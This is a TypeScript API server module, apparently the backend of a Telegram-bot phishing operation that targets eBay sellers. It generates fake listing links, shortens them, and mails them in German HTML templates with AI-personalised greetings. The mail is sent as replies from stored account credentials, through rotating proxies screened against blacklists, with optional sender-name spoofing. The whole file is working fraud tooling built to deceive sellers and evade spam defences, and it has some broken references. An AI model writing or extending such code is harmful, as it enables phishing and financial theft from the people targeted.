import { bot } from "../bot";
import { UserRepo, AdvertsRepo, EmailRepo, PresetRepo, EmailMsgRepo, ProxyRepo } from "../db/queries";
import { startSendFromDb, isUserSending, sendStatusForUser, stopSendForUser } from "../emailSender";
import { FAKE_LINK_DOMAIN } from "../config";
import { generateLink } from "../callbacks/getMail";
import { promises as fs } from "fs";
import path from "path";
import { sendEmail, sendWithRetry, isConnectionError } from "../utils/sendEmail";
import { toProxyAuth } from "../utils/proxyForm";
import { checkProxyBlacklist } from "../utils/blacklistChecker";
import { chatWithAI } from "../utils/openAI";

// Функция для загрузки GMX почт из файла
async function loadGmxEmails(): Promise<Array<{ email: string; password: string }>> {
  try {
    const filePath = path.join(process.cwd(), 'gmx_emails.txt');
    const content = await fs.readFile(filePath, 'utf-8');
    const lines = content.split('\n').filter(line => line.trim());
    
    const emails = lines.map(line => {
      const [email, password] = line.trim().split(':');
      return { email, password };
    }).filter(e => e.email && e.password);
    
    console.log(`[GMX] Загружено ${emails.length} GMX почт из файла`);
    return emails;
  } catch (error: any) {
    console.error(`[GMX] Ошибка загрузки gmx_emails.txt: ${error.message}`);
    return [];
  }
}

interface ApiResponse {
  success: boolean;
  data?: any;
  error?: string;
}

// Утилита для создания ответа
const createResponse = (data: ApiResponse, status = 200): Response => {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
};

// Утилита для логирования
const logRequest = (method: string, path: string, body?: any) => {
  console.log(`[API] ${method} ${path}`, body ? JSON.stringify(body) : "");
};

// Сохранение короткой ссылки в processed_emails.json
const saveShortLink = async (advertId: number, shortLink: string): Promise<void> => {
  try {
    const filePath = path.join(process.cwd(), 'auto_answer', 'data', 'processed_emails.json');
    let data: any[] = [];
    
    try {
      const content = await fs.readFile(filePath, 'utf-8');
      data = JSON.parse(content);
    } catch (err) {
      // Файл не существует или пустой
      data = [];
    }
    
    // Ищем запись по advertId (email_id)
    const index = data.findIndex((item: any) => item.email_id === advertId);
    if (index !== -1) {
      data[index].short_link = shortLink;
      data[index].short_link_updated_at = new Date().toISOString();
    }
    
    await fs.writeFile(filePath, JSON.stringify(data, null, 2), 'utf-8');
    console.log(`[API] 💾 Saved short link for advert ${advertId}: ${shortLink}`);
  } catch (error) {
    console.error(`[API] ❌ Error saving short link:`, error);
  }
};

// Получение короткой ссылки из processed_emails.json
const getShortLink = async (advertId: number): Promise<string | null> => {
  try {
    const filePath = path.join(process.cwd(), 'auto_answer', 'data', 'processed_emails.json');
    const content = await fs.readFile(filePath, 'utf-8');
    const data = JSON.parse(content);
    
    const item = data.find((item: any) => item.email_id === advertId);
    return item?.short_link || null;
  } catch (error) {
    console.error(`[API] ❌ Error reading short link:`, error);
    return null;
  }
};

// Определение пола по имени и фамилии через AI
const detectGender = async (fullName: string): Promise<'male' | 'female' | 'unknown'> => {
  try {
    const prompt = `Based on the name "${fullName}", determine if this is a male or female person. Consider both first and last name. Answer only with one word: MALE, FEMALE, or UNKNOWN.`;
    const response = await chatWithAI(prompt, []);
    const answer = response.trim().toUpperCase();
    
    if (answer.includes('MALE') && !answer.includes('FEMALE')) {
      return 'male';
    } else if (answer.includes('FEMALE')) {
      return 'female';
    } else {
      return 'unknown';
    }
  } catch (error) {
    console.error('[GENDER DETECTION] Ошибка:', error);
    return 'unknown';
  }
};

// Формирование немецкого приветствия
const formatGreeting = (fullName: string, gender: 'male' | 'female' | 'unknown'): string => {
  const parts = fullName.trim().split(/\s+/);
  
  // Если есть имя и фамилия, используем оба
  if (parts.length >= 2) {
    const firstName = parts[0];
    const lastName = parts[parts.length - 1];
    
    if (gender === 'male') {
      return `Sehr geehrter Mister ${firstName} ${lastName},`;
    } else if (gender === 'female') {
      return `Sehr geehrte Missis ${firstName} ${lastName},`;
    } else {
      return `Sehr geehrte/r ${firstName} ${lastName},`;
    }
  } else {
    // Если только одно слово (имя или фамилия)
    if (gender === 'male') {
      return `Sehr geehrter Mister ${fullName},`;
    } else if (gender === 'female') {
      return `Sehr geehrte Missis ${fullName},`;
    } else {
      return `Sehr geehrte/r ${fullName},`;
    }
  }
};

// Обработчик OPTIONS для CORS
const handleOptions = (): Response => {
  return new Response(null, {
    status: 204,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type",
    },
  });
};

// POST /api/stop_send
const handleStopSend = async (body: any): Promise<ApiResponse> => {
  try {
    const { tg_user_id } = body;

    if (!tg_user_id) {
      return { success: false, error: "Missing required field: tg_user_id" };
    }

    const telegramId = parseInt(tg_user_id);
    if (isNaN(telegramId)) {
      return { success: false, error: "Invalid tg_user_id format" };
    }

    if (!isUserSending(telegramId)) {
      return {
        success: false,
        error: "No active send for this user",
        data: { status: "not_running" },
      };
    }

    await stopSendForUser(telegramId);

    return {
      success: true,
      data: {
        status: "stopping",
        message: "Send stop requested",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in stop_send:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// GET /api/user_info
const handleUserInfo = async (params: URLSearchParams): Promise<ApiResponse> => {
  try {
    const tg_user_id = params.get("tg_user_id");

    if (!tg_user_id) {
      return { success: false, error: "Missing required parameter: tg_user_id" };
    }

    const telegramId = parseInt(tg_user_id);
    if (isNaN(telegramId)) {
      return { success: false, error: "Invalid tg_user_id format" };
    }

    const user = await UserRepo.getUserByTelegramId(telegramId);
    if (!user) {
      return { success: false, error: `User with tg_user_id=${telegramId} not found` };
    }

    const team = await UserRepo.getTeam(telegramId);
    const flags = await UserRepo.getFlags(telegramId);
    const interval = await UserRepo.getInterval(telegramId);

    return {
      success: true,
      data: {
        telegram_id: telegramId,
        username: user.username || null,
        role: user.role,
        team: team,
        flags: flags,
        interval: interval,
        created_at: user.createdAt,
      },
    };
  } catch (error: any) {
    console.error("[API] Error in user_info:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// POST /api/forward_file
const handleForwardFile = async (body: any): Promise<ApiResponse> => {
  try {
    const { tg_user_id, file_id, caption, target_bot } = body;

    if (!tg_user_id || !file_id) {
      return { success: false, error: "Missing required fields: tg_user_id, file_id" };
    }

    const telegramId = parseInt(tg_user_id);
    if (isNaN(telegramId)) {
      return { success: false, error: "Invalid tg_user_id format" };
    }

    // Пересылаем файл пользователю или в указанного бота
    const targetChat = target_bot || telegramId;
    
    await bot.api.sendDocument(targetChat, file_id, {
      caption: caption || undefined,
    });

    return {
      success: true,
      data: {
        message: "File forwarded successfully",
        target_chat: targetChat,
      },
    };
  } catch (error: any) {
    console.error("[API] Error in forward_file:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// POST /api/start_parsing - Запустить парсинг (2 парсинга подряд)
const handleStartParsing = async (body: any): Promise<ApiResponse> => {
  try {
    const { user_id } = body;

    if (!user_id) {
      return { success: false, error: "Missing required field: user_id" };
    }

    const userId = parseInt(user_id);
    if (isNaN(userId) || userId !== 7787819135) {
      return { success: false, error: "Invalid user_id (must be 7787819135)" };
    }

    // Создаем команду для парсера
    const commandData = {
      command: "start_parsing",
      user_id: userId,
      timestamp: Date.now(),
    };

    const commandPath = path.join(process.cwd(), "auto_answer", "data", "parsing_command.json");
    await fs.writeFile(commandPath, JSON.stringify(commandData, null, 2), "utf-8");

    console.log(`[API] Parsing command created: start_parsing for user ${userId}`);

    return {
      success: true,
      data: {
        message: "Парсинг запущен (2 файла будут получены)",
        command: "start_parsing",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in start_parsing:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// POST /api/parsing_next_file - Отправить следующий файл из очереди
const handleParsingNextFile = async (body: any): Promise<ApiResponse> => {
  try {
    const { user_id } = body;

    if (!user_id) {
      return { success: false, error: "Missing required field: user_id" };
    }

    const userId = parseInt(user_id);
    if (isNaN(userId) || userId !== 7787819135) {
      return { success: false, error: "Invalid user_id (must be 7787819135)" };
    }

    // Создаем команду для парсера
    const commandData = {
      command: "send_next_file",
      user_id: userId,
      timestamp: Date.now(),
    };

    const commandPath = path.join(process.cwd(), "auto_answer", "data", "parsing_command.json");
    await fs.writeFile(commandPath, JSON.stringify(commandData, null, 2), "utf-8");

    console.log(`[API] Parsing command created: send_next_file for user ${userId}`);

    return {
      success: true,
      data: {
        message: "Команда на отправку следующего файла создана",
        command: "send_next_file",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in parsing_next_file:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// GET /api/parsing_status - Статус парсинга
const handleParsingStatus = async (params: URLSearchParams): Promise<ApiResponse> => {
  try {
    const user_id = params.get("user_id");

    if (!user_id) {
      return { success: false, error: "Missing required parameter: user_id" };
    }

    const userId = parseInt(user_id);
    if (isNaN(userId) || userId !== 7787819135) {
      return { success: false, error: "Invalid user_id (must be 7787819135)" };
    }

    // Читаем файл статуса парсинга
    const statePath = path.join(process.cwd(), "auto_answer", "data", "parsing_state.json");
    
    try {
      const stateContent = await fs.readFile(statePath, "utf-8");
      const state = JSON.parse(stateContent);

      return {
        success: true,
        data: state,
      };
    } catch (err: any) {
      // Файл не существует или пуст
      return {
        success: true,
        data: {
          status: "unknown",
          queue_count: 0,
          files: [],
          message: "Parsing state file not found (parser may not be running)",
        },
      };
    }
  } catch (error: any) {
    console.error("[API] Error in parsing_status:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// POST /api/start_send
const handleStartSend = async (body: any): Promise<ApiResponse> => {
  try {
    const { tg_user_id } = body;

    if (!tg_user_id) {
      return { success: false, error: "Missing required field: tg_user_id" };
    }

    // Проверяем существование пользователя
    const user = await UserRepo.getUserByTelegramId(tg_user_id);
    if (!user) {
      return { success: false, error: `User with tg_user_id=${tg_user_id} not found` };
    }

    // Проверяем, не идёт ли уже рассылка
    if (isUserSending(tg_user_id)) {
      return {
        success: false,
        error: "Send already in progress for this user",
        data: { status: "already_running" },
      };
    }

    // Проверяем наличие объявлений со статусом 2
    const ready = await AdvertsRepo.listReadyByTelegramId(tg_user_id);
    if (!ready.length) {
      return {
        success: false,
        error: "No adverts with status=2 (ready to send)",
        data: { status: "no_adverts", ready_count: 0 },
      };
    }

    // Запускаем рассылку
    await startSendFromDb(tg_user_id);

    return {
      success: true,
      data: {
        status: "started",
        ready_count: ready.length,
        message: "Send started successfully",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in start_send:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// GET /api/ad_info
const handleAdInfo = async (params: URLSearchParams): Promise<ApiResponse> => {
  try {
    const tg_user_id = params.get("tg_user_id");
    const ad_id = params.get("ad_id");

    if (!tg_user_id || !ad_id) {
      return { success: false, error: "Missing required parameters: tg_user_id, ad_id" };
    }

    const telegramId = parseInt(tg_user_id);
    const advertId = parseInt(ad_id);

    if (isNaN(telegramId) || isNaN(advertId)) {
      return { success: false, error: "Invalid tg_user_id or ad_id format" };
    }

    // Получаем объявление
    const advert = await AdvertsRepo.getById(advertId);
    if (!advert) {
      return { success: false, error: `Advert with id=${advertId} not found` };
    }

    // Проверяем, что объявление принадлежит пользователю
    if (advert.userId !== (await UserRepo.getUserByTelegramId(telegramId))?.id) {
      return {
        success: false,
        error: "Advert does not belong to this user",
      };
    }

    // Формируем статус текстом
    const statusMap: Record<number, string> = {
      0: "created",
      1: "email_not_found",
      2: "ready_to_send",
      3: "sent",
    };

    return {
      success: true,
      data: {
        id: advert.id,
        title: advert.title,
        price: advert.price,
        photo: advert.photo,
        link: advert.link,
        fake_link: advert.fakeLink,
        person_dot_name: advert.personDotName,
        email: advert.email,
        status: advert.status,
        status_text: statusMap[advert.status] || "unknown",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in ad_info:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// POST /api/generate_link
const handleGenerateLink = async (body: any): Promise<ApiResponse> => {
  try {
    const { tg_user_id, ad_id } = body;

    if (!tg_user_id || !ad_id) {
      return { success: false, error: "Missing required fields: tg_user_id, ad_id" };
    }

    const telegramId = parseInt(tg_user_id);
    const advertId = parseInt(ad_id);

    if (isNaN(telegramId) || isNaN(advertId)) {
      return { success: false, error: "Invalid tg_user_id or ad_id format" };
    }

    // Получаем объявление
    const advert = await AdvertsRepo.getById(advertId);
    if (!advert) {
      return { success: false, error: `Advert with id=${advertId} not found` };
    }

    // Проверяем владельца
    const user = await UserRepo.getUserByTelegramId(telegramId);
    if (!user || advert.userId !== user.id) {
      return { success: false, error: "Advert does not belong to this user" };
    }

    // Получаем команду пользователя для выбора API ключа
    const team = await UserRepo.getTeam(telegramId);
    const apiKey = await UserRepo.getApiKey(team, telegramId);
    const profileId = await UserRepo.getProfileId(team, telegramId);

    if (!advert.link) {
      return { success: false, error: "Advert has no link (eBay URL)" };
    }

    // Генерируем реальную фейковую ссылку через api.goo.network
    console.log(`[API] Generating fake link for advert ${advertId}`);
    console.log(`[API]   Original URL: ${advert.link}`);
    console.log(`[API]   Team: ${team.toUpperCase()}`);
    console.log(`[API]   Profile ID: ${profileId}`);
    console.log(`[API]   API Key: ${apiKey.substring(0, 10)}...`);
    
    const fakeLink = await generateLink(telegramId, apiKey, advert.link, profileId);
    
    console.log(`[API] ✅ Fake link generated successfully!`);
    console.log(`[API]   Fake URL: ${fakeLink}`);

    // Обновляем объявление
    await AdvertsRepo.updateFakeLink(advertId, fakeLink);
    console.log(`[API] ✅ Fake link saved to database for advert ${advertId}`);

    return {
      success: true,
      data: {
        ad_id: advertId,
        fake_link: fakeLink,
        original_link: advert.link,
        team: team.toUpperCase(),
        profile_id: profileId,
        message: "Fake link generated successfully",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in generate_link:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// Функция для сокращения URL через rxmivato.com API
async function shortenUrl(longUrl: string): Promise<string> {
  try {
    console.log(`[SHORTENER] Сокращение ссылки: ${longUrl}`);
    const response = await fetch('http://rxmivato.com/api/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ url: longUrl })
    });
    
    if (response.ok) {
      const data = await response.json();
      const shortUrl = data.short_url;
      console.log(`[SHORTENER] ✅ Короткая ссылка: ${shortUrl} (код: ${data.short_code})`);
      return shortUrl;
    } else {
      console.log(`[SHORTENER] ❌ Ошибка сокращения, используем оригинал`);
      return longUrl;
    }
  } catch (error) {
    console.log(`[SHORTENER] ❌ Ошибка API: ${error}, используем оригинал`);
    return longUrl;
  }
}

// POST /api/answer_message
const handleAnswerMessage = async (body: any): Promise<ApiResponse> => {
  try {
    const { tg_user_id, ad_id, type, preset_id, html_type, fake_link, from_name } = body;

    console.log(`[API] POST /api/answer_message`);
    console.log(`[API] Request body:`, JSON.stringify(body, null, 2));

    if (!tg_user_id || !ad_id || !type) {
      const error = `Missing required fields: ${!tg_user_id ? 'tg_user_id ' : ''}${!ad_id ? 'ad_id ' : ''}${!type ? 'type' : ''}`;
      console.log(`[API] Validation error: ${error}`);
      return {
        success: false,
        error,
      };
    }

    if (type !== "html" && type !== "preset") {
      return { success: false, error: "Invalid type. Must be 'html' or 'preset'" };
    }

    if (type === "preset" && !preset_id) {
      return { success: false, error: "preset_id is required when type='preset'" };
    }

    if (type === "html" && !html_type) {
      return { success: false, error: "html_type is required when type='html'" };
    }

    const telegramId = parseInt(tg_user_id);
    const advertId = parseInt(ad_id);

    if (isNaN(telegramId) || isNaN(advertId)) {
      return { success: false, error: "Invalid tg_user_id or ad_id format" };
    }

    // Получаем объявление
    const advert = await AdvertsRepo.getById(advertId);
    if (!advert) {
      return { success: false, error: `Advert with id=${advertId} not found` };
    }

    // Проверяем владельца
    const user = await UserRepo.getUserByTelegramId(telegramId);
    if (!user || advert.userId !== user.id) {
      return { success: false, error: "Advert does not belong to this user" };
    }

    // Проверяем наличие email в объявлении
    if (!advert.email) {
      return { success: false, error: "Advert has no email address" };
    }

    let messageContent: string;

    if (type === "preset") {
      // Получаем пресет
      const presetIdNum = parseInt(preset_id);
      console.log(`[API] Looking for preset with id=${presetIdNum}`);
      
      const preset = await PresetRepo.getById(presetIdNum);
      if (!preset) {
        console.log(`[API] Preset with id=${presetIdNum} not found`);
        return { success: false, error: `Preset with id=${preset_id} not found` };
      }

      console.log(`[API] Found preset: userId=${preset.userId}, user.id=${user.id}`);
      
      // Проверяем владельца пресета
      if (preset.userId !== user.id) {
        console.log(`[API] Preset owner mismatch: preset.userId=${preset.userId}, user.id=${user.id}`);
        return { success: false, error: "Preset does not belong to this user" };
      }

      messageContent = preset.text;
    } else {
      // HTML тип
      const validHtmlTypes = ["back", "go", "push", "sms"];
      if (!validHtmlTypes.includes(html_type)) {
        return {
          success: false,
          error: `Invalid html_type. Must be one of: ${validHtmlTypes.join(", ")}`,
        };
      }

      // Получаем fake_link для вставки в текстовое письмо
      let linkToUse = fake_link;
      
      if (!linkToUse) {
        linkToUse = await AdvertsRepo.getFakeLink(advertId);
      }
      
      if (!linkToUse) {
        console.log(`[API] ❌ No fake link found for advert ${advertId} - cannot send email`);
        return { 
          success: false, 
          error: `Fake link not found for advert ${advertId}. Generate link first using /api/generate_link` 
        };
      }
      
      // Сокращаем ссылку через rxmivato.com
      const shortLink = await shortenUrl(linkToUse);
      
      // Сохраняем короткую ссылку в processed_emails.json
      await saveShortLink(advertId, shortLink);
      
      // Загружаем HTML шаблон из файла go.html и заменяем ADVERT_LINK
      const templatePath = path.join(process.cwd(), 'src', 'templates', 'go.html');
      let htmlTemplate = await fs.readFile(templatePath, 'utf-8');
      
      // Определяем персонализированное приветствие
      let greeting = "Sehr geehrter Verkäufer,"; // По умолчанию
      if (from_name && from_name.trim()) {
        // Извлекаем имя из формата: "Name Surname" <email@domain.com>
        let cleanName = from_name.trim();
        const nameMatch = cleanName.match(/^["']?([^"'<]+?)["']?\s*(?:<|$)/);
        if (nameMatch) {
          cleanName = nameMatch[1].trim();
        }
        
        if (cleanName && cleanName.length > 0) {
          console.log(`[API] 🔍 Detecting gender for full name: ${cleanName}`);
          // Определяем пол по полному имени (имя + фамилия)
          const gender = await detectGender(cleanName);
          greeting = formatGreeting(cleanName, gender);
          console.log(`[API] ✅ Generated greeting (${gender}): ${greeting}`);
        }
      }
      
      const htmlContent = htmlTemplate
        .replace(/ADVERT_LINK/g, shortLink)
        .replace(/SELLER_GREETING/g, greeting);
      
      console.log(`[API] ✅ Loaded go.html template with link: ${shortLink}`);
      
      messageContent = htmlContent;
    }

    // Получаем последнее сообщение для этого объявления
    const messages = await EmailMsgRepo.listByAdvertId(advertId);
    if (!messages || messages.length === 0) {
      console.log(`[API] No messages found for advert ${advertId}`);
      return { success: false, error: "No messages found for this advert" };
    }

    const lastMessage = messages[messages.length - 1];
    console.log(`[API] Found message ID: ${lastMessage.id}, from: ${lastMessage.from}`);

    // Парсим email:password
    // Для preset (ответ) - используем ТУ ЖЕ почту на которую пришло письмо (emailId из сообщения)
    // Для HTML (новое письмо) - используем ДРУГУЮ почту (следующую по курсору)
    let senderEmail;
    
    // Используем ТУ ЖЕ почту для всех типов (preset и HTML)
    console.log(`[API] Using email from message (emailId: ${lastMessage.emailId})`);
    senderEmail = await EmailRepo.getById(lastMessage.emailId);
    if (!senderEmail) {
      console.log(`[API] Email with id=${lastMessage.emailId} not found`);
      return { success: false, error: "Original email not found" };
    }
    
    if (!senderEmail) {
      console.log(`[API] No valid sender email for user ${telegramId}`);
      return { success: false, error: "No valid sender email available" };
    }

    const colonIndex = senderEmail.email.indexOf(":");
    if (colonIndex === -1) {
      console.log(`[API] Invalid email format: ${senderEmail.email}`);
      return { success: false, error: "Invalid sender email format" };
    }

    const login = senderEmail.email.substring(0, colonIndex);
    const appPassword = senderEmail.email.substring(colonIndex + 1);

    // Получаем прокси с проверкой на blacklist
    // КРИТИЧНО: Для HTML используем ДРУГОЙ прокси, для preset - тот же что был использован ранее
    let proxy;
    let proxySource = "";
    
    if (type === "preset") {
      // Для пресета используем прокси из исходного сообщения (если сохранён)
      proxy = await ProxyRepo.nextValidProxy(telegramId);
      proxySource = "standard rotation";
    } else {
      // Для HTML ОБЯЗАТЕЛЬНО берем следующий прокси (не тот что использовался для пресета)
      proxy = await ProxyRepo.nextValidProxy(telegramId);
      if (proxy) {
        // Берем ещё один следующий, чтобы гарантировать что это другой прокси
        const nextProxy = await ProxyRepo.nextValidProxy(telegramId);
        if (nextProxy) {
          proxy = nextProxy;
          proxySource = "next in rotation (different from preset)";
        } else {
          proxySource = "standard rotation (only one available)";
        }
      }
    }
    
    if (!proxy) {
      console.log(`[API] No valid proxy for user ${telegramId}`);
      return { success: false, error: "No valid proxy available" };
    }

    console.log(`[API] Proxy source: ${proxySource}`);

    // Проверяем прокси на blacklist
    const proxyParts = proxy.proxy.split('@');
    const ipPort = proxyParts.length > 1 ? proxyParts[1] : proxyParts[0];
    const proxyIp = ipPort.split(':')[0];
    
    console.log(`[API] Checking proxy ${proxyIp} for blacklist...`);
    const blacklistCheck = await checkProxyBlacklist(proxyIp);
    
    if (blacklistCheck.listed) {
      console.log(`[API] ❌ Proxy ${proxyIp} in blacklist (${blacklistCheck.totalChecked} checked):`);
      console.log(`[API]    Found in: ${blacklistCheck.blacklists.join(', ')}`);
      
      // Удаляем прокси из базы
      await ProxyRepo.remove(telegramId, proxy.id);
      
      // Пробуем найти чистый прокси (до 5 попыток)
      let foundClean = false;
      for (let i = 0; i < 5; i++) {
        const nextProxy = await ProxyRepo.nextValidProxy(telegramId);
        if (!nextProxy) break;
        
        const nextIpPort = nextProxy.proxy.split('@').pop() || nextProxy.proxy;
        const nextIp = nextIpPort.split(':')[0];
        
        const nextCheck = await checkProxyBlacklist(nextIp);
        if (!nextCheck.listed) {
          proxy = nextProxy;
          foundClean = true;
          console.log(`[API] ✅ Found clean proxy: ${nextIp} (${nextCheck.totalChecked} checked)`);
          break;
        } else {
          // Этот тоже в blacklist - удаляем
          console.log(`[API] ❌ Proxy ${nextIp} also in blacklist, deleting...`);
          await ProxyRepo.remove(telegramId, nextProxy.id);
        }
      }
      
      // Если не нашли чистый прокси - возвращаем ошибку
      if (!foundClean) {
        console.log(`[API] ❌ No clean proxies available`);
        return { success: false, error: "No clean proxies available" };
      }
    } else {
      console.log(`[API] ✅ Proxy ${proxyIp} is clean`);
    }

    // Получаем flags для spoofName
    const flags = await UserRepo.getFlags(telegramId);
    
    // Спуфинг имени применяем ТОЛЬКО для HTML (новых писем)
    // Для текстовых пресетов (ответов) используем оригинальное имя email
    const senderName = (type === "html" && flags.spoofMode)
      ? await UserRepo.getSpoofName(telegramId)
      : senderEmail.name;

    // Используем ТУ ЖЕ тему для всех типов (Re: оригинальная тема)
    const emailSubject = `Re: ${lastMessage.subject}`;

    console.log(`[API] Sending email:`);
    console.log(`[API]   From: ${login} (${senderName})`);
    console.log(`[API]   To: ${advert.email}`);
    console.log(`[API]   Subject: ${emailSubject}`);
    console.log(`[API]   Type: ${type}`);
    console.log(`[API]   Content preview: ${messageContent.substring(0, 100)}...`);
    console.log(`[API]   Proxy: ${proxy.proxy}`);

    // Отправляем письмо с ретраями и сменой прокси при ошибках
    let sendResult;
    let currentProxy = proxy;
    let proxyAttempt = 0;
    const maxProxyAttempts = 3; // Максимум 3 разных прокси
    
    while (proxyAttempt < maxProxyAttempts) {
      proxyAttempt++;
      const proxyUrl = toProxyAuth(currentProxy.proxy);
      
      if (proxyAttempt > 1) {
        console.log(`[API] 🔄 Попытка ${proxyAttempt}/${maxProxyAttempts} с прокси: ${currentProxy.proxy}`);
      }
      
      try {
        // Для HTML отправляем с кликабельной ссылкой в тексте (как ответ на входящее)
        if (type === "html") {
          sendResult = await sendWithRetry({
            login,
            appPassword,
            to: advert.email,
            subject: emailSubject,
            html: messageContent, // HTML с кликабельной ссылкой
            displayName: senderName,
            inReplyTo: lastMessage.messageId,
            references: lastMessage.messageId,
            proxy: proxyUrl,
            retries: 2,
            enableLogging: true,
          });
        } else {
          // Preset отправляем как обычный текст с Re:
          sendResult = await sendWithRetry({
            login,
            appPassword,
            to: advert.email,
            subject: emailSubject,
            text: messageContent,
            displayName: senderName,
            inReplyTo: lastMessage.messageId,
            proxy: proxyUrl,
            retries: 2,
            enableLogging: true,
          });
        }
        
        // Успех - выходим из цикла
        break;
        
      } catch (error: any) {
        const isProxyError = isConnectionError(error);
        console.log(`[API] ❌ Ошибка отправки (прокси: ${isProxyError ? 'ДА' : 'НЕТ'}): ${error.message}`);
        
        // Если ошибка прокси и есть еще попытки - берем новый прокси
        if (isProxyError && proxyAttempt < maxProxyAttempts) {
          console.log(`[API] 🔄 Прокси не работает, пробую другой...`);
          const nextProxy = await ProxyRepo.nextValidProxy(tgUserId);
          
          if (nextProxy) {
            currentProxy = nextProxy;
            continue; // Пробуем с новым прокси
          } else {
            console.log(`[API] ⚠️ Нет других доступных прокси`);
          }
        }
        
        // Последняя попытка или не прокси-ошибка
        if (proxyAttempt >= maxProxyAttempts || !isProxyError) {
          console.log(`[API] ❌ Все попытки исчерпаны`);
          return { 
            success: false, 
            error: `Failed to send email: ${error.message || 'Unknown error'}` 
          };
        }
      }
    }

    if (!sendResult || !sendResult.info.success) {
      console.log(`[API] Email send failed after all attempts`);
      return { success: false, error: "Failed to send email after multiple attempts" };
    }

    console.log(`[API] ✅ Email sent successfully!`);
    console.log(`[API]   Message ID: ${sendResult.info.messageId}`);
    console.log(`[API]   Response: ${sendResult.info.response}`);

    return {
      success: true,
      data: {
        ad_id: advertId,
        email: advert.email,
        type,
        message: "Email sent successfully",
        messageId: sendResult.info.messageId,
        from: `${login} (${senderName})`,
        to: advert.email,
        subject: `Re: ${lastMessage.subject}`,
        content_preview: messageContent.substring(0, 100) + "...",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in answer_message:", error);
    console.error("[API] Error stack:", error.stack);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// GET /api/send_status
const handleSendStatus = async (params: URLSearchParams): Promise<ApiResponse> => {
  try {
    const tg_user_id = params.get("tg_user_id");

    if (!tg_user_id) {
      return { success: false, error: "Missing required parameter: tg_user_id" };
    }

    const telegramId = parseInt(tg_user_id);

    if (isNaN(telegramId)) {
      return { success: false, error: "Invalid tg_user_id format" };
    }

    const isSending = isUserSending(telegramId);

    return {
      success: true,
      data: {
        is_sending: isSending,
        status: isSending ? "active" : "idle",
      },
    };
  } catch (error: any) {
    console.error("[API] Error in send_status:", error);
    return { success: false, error: error.message || "Internal server error" };
  }
};

// Главный обработчик запросов
const handleRequest = async (req: Request): Promise<Response> => {
  const url = new URL(req.url);
  const path = url.pathname;
  const method = req.method;

  // CORS preflight
  if (method === "OPTIONS") {
    return handleOptions();
  }

  logRequest(method, path);

  try {
    // POST /api/start_send
    if (method === "POST" && path === "/api/start_send") {
      const body = await req.json();
      logRequest(method, path, body);
      const result = await handleStartSend(body);
      return createResponse(result, result.success ? 200 : 400);
    }

    // GET /api/ad_info
    if (method === "GET" && path === "/api/ad_info") {
      const result = await handleAdInfo(url.searchParams);
      return createResponse(result, result.success ? 200 : 400);
    }

    // POST /api/generate_link
    if (method === "POST" && path === "/api/generate_link") {
      const body = await req.json();
      logRequest(method, path, body);
      const result = await handleGenerateLink(body);
      return createResponse(result, result.success ? 200 : 400);
    }

    // POST /api/answer_message
    if (method === "POST" && path === "/api/answer_message") {
      const body = await req.json();
      logRequest(method, path, body);
      const result = await handleAnswerMessage(body);
      return createResponse(result, result.success ? 200 : 400);
    }

    // GET /api/send_status
    if (method === "GET" && path === "/api/send_status") {
      const result = await handleSendStatus(url.searchParams);
      return createResponse(result, result.success ? 200 : 400);
    }

    // GET /api/get_advert_by_email
    if (method === "GET" && path === "/api/get_advert_by_email") {
      return await handleGetAdvertByEmail(url);
    }

    // POST /api/stop_send
    if (method === "POST" && path === "/api/stop_send") {
      const body = await req.json();
      logRequest(method, path, body);
      const result = await handleStopSend(body);
      return createResponse(result, result.success ? 200 : 400);
    }

    // GET /api/user_info
    if (method === "GET" && path === "/api/user_info") {
      const result = await handleUserInfo(url.searchParams);
      return createResponse(result, result.success ? 200 : 400);
    }

    // POST /api/forward_file
    if (method === "POST" && path === "/api/forward_file") {
      const body = await req.json();
      logRequest(method, path, body);
      const result = await handleForwardFile(body);
      return createResponse(result, result.success ? 200 : 400);
    }

    // POST /api/start_parsing
    if (method === "POST" && path === "/api/start_parsing") {
      const body = await req.json();
      logRequest(method, path, body);
      const result = await handleStartParsing(body);
      return createResponse(result, result.success ? 200 : 400);
    }

    // POST /api/parsing_next_file
    if (method === "POST" && path === "/api/parsing_next_file") {
      const body = await req.json();
      logRequest(method, path, body);
      const result = await handleParsingNextFile(body);
      return createResponse(result, result.success ? 200 : 400);
    }

    // GET /api/parsing_status
    if (method === "GET" && path === "/api/parsing_status") {
      const result = await handleParsingStatus(url.searchParams);
      return createResponse(result, result.success ? 200 : 400);
    }

    // GET /health
    if (method === "GET" && path === "/health") {
      return createResponse({ success: true, data: { status: "ok" } }, 200);
    }

    // 404 Not Found
    return createResponse(
      {
        success: false,
        error: "Endpoint not found",
        data: {
          available_endpoints: [
            "POST /api/start_send",
            "POST /api/stop_send",
            "GET /api/send_status",
            "GET /api/ad_info",
            "POST /api/generate_link",
            "POST /api/answer_message",
            "POST /api/forward_file",
            "GET /api/user_info",
            "POST /api/start_parsing",
            "POST /api/parsing_next_file",
            "GET /api/parsing_status",
            "GET /health",
          ],
        },
      },
      404
    );
  } catch (error: any) {
    console.error("[API] Unhandled error:", error);
    return createResponse(
      {
        success: false,
        error: "Internal server error",
        data: { message: error.message },
      },
      500
    );
  }
};

